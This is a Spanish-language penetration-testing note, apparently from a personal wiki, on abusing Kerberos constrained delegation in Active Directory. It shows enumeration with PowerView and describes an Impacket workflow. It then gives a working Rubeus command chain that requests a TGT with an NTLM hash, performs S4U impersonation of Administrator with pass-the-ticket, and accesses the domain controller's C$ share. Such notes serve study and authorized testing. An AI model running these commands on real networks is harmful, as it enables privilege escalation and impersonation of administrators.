# Constrained Delegation

Tags: #AD #Windows 

La delegación restringida (Constrained Delegation) en Active Directory es una funcionalidad de seguridad que permite a un servicio, como un servidor o una aplicación, solicitar tickets Kerberos en representación de un usuario, pero restringiendo esta capacidad únicamente a servicios específicos previamente configurados. Esta característica se introdujo para mejorar la seguridad y brindar un mayor control sobre la delegación de credenciales entre servicios dentro de un entorno de red.

```bash 
# Tipos de Delegación Restringida:

Existen dos modos principales de delegación restringida:

1. Delegación Restringida con TGT (Trusted to Authenticate for Delegation): En este modo, el servicio no puede solicitar tickets de servicio en nombre de un usuario a menos que el usuario haya autenticado directamente al servicio que está realizando la delegación. Esto es más seguro porque requiere una autenticación inicial con el servicio que delega.
    
2. Delegación Restringida sin TGT (Kerberos Only): Aquí, el servicio puede solicitar tickets para otros servicios especificados en la lista de servicios permitidos sin que el usuario se autentique directamente con el servicio que delega.
    
3. Seguridad y Riesgos: La delegación restringida, aunque más segura que la delegación no restringida (Unconstrained Delegation), aún presenta riesgos si un atacante obtiene el control de la cuenta del servicio que puede delegar. Con este control, el atacante puede acceder a otros servicios como si fuera el usuario autenticado. Por lo tanto, es fundamental restringir el uso de la delegación a cuentas de servicios necesarias y monitorear estas cuentas de manera continua.
```

## Constrained Delegation en Cuentas de Computadora

Para las cuentas de computadora, la delegación restringida se utiliza para controlar los servicios que se ejecutan en una máquina en particular y cómo esos servicios pueden actuar en nombre de los usuarios. Por ejemplo, un servidor web que corre en una máquina específica podría necesitar acceder a otro servidor en nombre del usuario para obtener información. Configurando la delegación restringida en la cuenta de la computadora que hospeda el servidor web, controlamos a qué servicios externos puede este servidor acceder con las credenciales de un usuario.

```bash 
# Uso de Impacket

1. Identificación del Servicio Delegado: Primero, identificarías el servicio específico al que se permite la delegación. En tu salida, estos están listados bajo "msds-allowedtodelegateto". Parece que "Suspicious-PC" puede delegar a ciertos servicios HTTP en "First-DC", mientras que "USER-SERVER" puede delegar a varios servicios "HOST" y "TERMSRV".
    
2. Obtención de un Ticket de Servicio: Luego, podrías usar una herramienta como "getST.py" de Impacket para obtener un ticket de servicio (TGS) para el servicio que se permite delegar. Necesitarías tener acceso a una cuenta que tenga permisos para solicitar dicho ticket, que podría ser cualquier usuario o cuenta de servicio que se autentique con el servidor que tiene la delegación restringida configurada.
    
3. Uso del Ticket de Servicio: Una vez que tienes el TGS, puedes usar otra herramienta de Impacket, como "psexec.py" o "wmiexec.py", para usar ese ticket y autenticarte en el servicio de destino, ejecutando comandos o realizando otras acciones como si fueras el usuario cuyo ticket has obtenido.
```

```powershell
# Esta vulnerabilidad viene del resultado de ADPeas y debe de contener lo siguiente

Nota: 
	1. UserAccountControl = TRUSTED_TO_AUTH_FOR_DELEGATION
	2. sAMAccountName = Nombre del equipo para saber cual es el que de debe de comprometer 'Es quien tiene los permisos'
	3. msDS-AllowedToDelegateTo = HOST/Domain1.corp   # Equipo victima 'El dominio al cual se puede comprometer'


# Identificar el Constrained Delegation 
❯ Get-DomainComputer -TrustedToAuth | select samaccountname, samaccounttype, msds-allowedtodelegateto, serviceprincipalname



# Resultado
1. Suspicious-PC$:
    
    - 'samaccountname': El nombre de la cuenta de la máquina es Suspicious-PC$.
    - 'samaccounttype': Indica que esta cuenta es una cuenta de máquina.
    - 'msds-allowedtodelegateto': Lista los servicios a los que esta máquina puede presentar credenciales en nombre de otro usuario. En este caso, está limitado a ciertos servicios HTTP en 'First-DC.domain1.corp'.
    - 'useraccountcontrol': Indica el tipo de cuenta, que es una cuenta de confianza de estación de trabajo.
        
    
2. USER-SERVER$:
    - 'samaccountname': El nombre de la cuenta de la máquina es USER-SERVER$.
    - 'samaccounttype': Indica que esta cuenta es una cuenta de máquina.
    - 'msds-allowedtodelegateto': Lista los servicios a los que esta máquina puede presentar credenciales en nombre de otro usuario. Aquí, está limitado a ciertos servicios HOST en 'First-DC.domain1.corp'.
    - 'serviceprincipalname' (SPN): Este es un identificador único para cada instancia del servicio. Se utilizan para la autenticación Kerberos. La presencia de términos como WSMAN y TERMSRV sugiere que esta máquina está ejecutando servicios de administración remota de Windows y servicios de terminal (Remote Desktop Services), respectivamente.
    - 'useraccountcontrol': Indica el tipo de cuenta, que es una cuenta de confianza de estación de trabajo.
```

```bash 
Un atacante que ha comprometido cualquiera de estas máquinas (por ejemplo, obteniendo las credenciales adecuadas o explotando alguna vulnerabilidad) puede utilizar la característica de delegación restringida para autenticarse en el 'First-DC.domain1.corp' como cualquier usuario que haya iniciado sesión previamente en la máquina comprometida, limitado a los servicios especificados en 'msds-allowedtodelegateto'.

1. Si un atacante compromete 'Suspicious-PC$', podría delegar credenciales para autenticarse hacia servicios HTTP específicos en 'First-DC.domain1.corp'.
    
2. Si 'USER-SERVER$' es comprometido, el atacante podría utilizar esta delegación para autenticarse hacia servicios que utilizan el protocolo HOST (generalmente servicios a nivel de sistema operativo o servicios de red) en 'First-DC.domain1.corp'.
```

## Utilizando Rubeus

```powershell
❯ klist purge   # Eliminamos los tickets de servicio que se encuentran en cache

❯ ./Rubeus.exe asktgt /user:USER-SERVER /ntlm:dadef894e564c991a5a5714e0a7efc67 /domain:domain1.corp /outfile:userserver.tgt   # Solicitar un TGT

❯ .\Rubeus.exe s4u /ticket:userserver.tgt /msdsspn:"HOST/First-DC.domain1.corp" /impersonateuser:Administrator /altservice:CIFS /ptt     # Se hace un Pass-The-Ticket y solicitas el TGS

❯ klist         # Mirar los tickets de servicio 

❯ dir \\First-DC.domain1.corp\c$    # Validar los recursos 
```